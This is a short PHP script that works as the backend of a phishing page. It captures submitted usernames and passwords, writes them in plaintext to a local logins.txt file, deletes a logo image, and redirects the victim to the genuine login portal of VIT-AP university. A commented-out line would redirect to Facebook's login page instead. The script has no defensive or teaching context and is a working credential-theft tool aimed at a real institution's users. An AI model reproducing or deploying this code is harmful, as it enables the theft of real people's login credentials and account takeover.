 <?php

 if(isset($_POST['uname'])) {
    $handle = fopen('logins.txt', 'a');
    $uname = "username: ".$_POST['uname']." Password: ".$_POST['passwd']." \r\n";
  	fwrite($handle, $uname);

  $file_pointer = "new VIT_AP logo.png";  
    unlink($file_pointer);
   //  $handle = fopen('logins.json', 'a');
   //  $myObj->uname = $_POST['xyz'];
   //  $myObj->pwd = $_POST['abc'];
        
   //  $myJSON = json_encode($myObj);

   //  fwrite($handle, $myJSON);
//  header("Location:https://www.facebook.com/login/");
   header("Location:http://vtop2.vitap.ac.in:8070/vtop/initialProcess");
  exit();
   }
?>
